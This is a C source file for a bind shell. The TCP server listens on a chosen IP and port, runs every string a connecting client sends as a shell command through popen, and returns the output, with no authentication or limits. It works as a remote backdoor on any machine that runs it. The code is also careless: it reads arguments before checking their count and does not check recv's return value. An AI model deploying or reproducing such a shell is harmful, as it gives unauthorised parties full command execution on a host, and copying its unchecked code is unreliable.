#include <stdio.h> // for "printf()"
#include <stdlib.h> // for "atoi()"
#include <string.h> // for "memset()"
#include <unistd.h> // for "close()"
#include <sys/socket.h> // for "socket(), connect(), send() and recv()"
#include <arpa/inet.h> //for "sockaddr_in and inet_addr()"

#define MAXSIZE 9192

int main(int argc, char *argv[]){

	//Configuration of IP address & port number
	int port = atoi(argv[1]);
	char *ip = argv[2];

	char cmd[MAXSIZE];
	char buffer[MAXSIZE];
	char strings_msg[MAXSIZE+1];

	FILE *output;

	int server_socket, client_socket, binding;

	struct sockaddr_in server_addr, client_addr;
	int n, len;

	if (argc != 3) {
         printf("You need to specify port number and IP address ! \n");
         exit(1);
     }
	
	server_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (server_socket < 0){
		perror ("[-] Socket error");
		exit (1);
	}

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(port);
	server_addr.sin_addr.s_addr = inet_addr(ip);

	printf("[+] Server started. \n");

	binding = bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));

	if (binding < 0){
		perror("[-] Bind error ");
		exit(1);
	}

	else {
		printf("[+] Bind to port number : %d | IP address : %s \n", port, ip);
		n = listen(server_socket,1);

		if(n<0){
			printf("Error during listen()\n");
			exit(0);
		}

		printf("listening... \n");

		len = sizeof(client_addr);
		client_socket = accept(server_socket, (struct sockaddr*)&client_addr,&len);

		if(client_socket < 0){
			printf("Error during accept()\n");
			exit(0);
		}

		printf("[+] Client connected from %s ! \n",inet_ntoa(client_addr.sin_addr));
	}

	// Loop for exchange between Client & Server
	while(1){

		bzero(cmd,MAXSIZE);
		bzero(buffer,MAXSIZE);

		// Receve and convert the socket from the client
		int bytes_of_socket  = recv(client_socket, cmd, sizeof(cmd),0);
		strncpy(strings_msg, cmd, bytes_of_socket);
		strings_msg[bytes_of_socket] = '\0';

		// Execute Linux command & create an output of this command
		output = popen (strings_msg, "r");
		if (output == NULL){
			fputs("[+] Connexion with client closed ! \n", stderr);
			close(server_socket);
			exit(0);
		}

		while (fgets(buffer, MAXSIZE-1, output) != NULL){
			send(client_socket, buffer, strlen(buffer), 0);
			sleep(0.01);
		}
	}

	return 0;
}
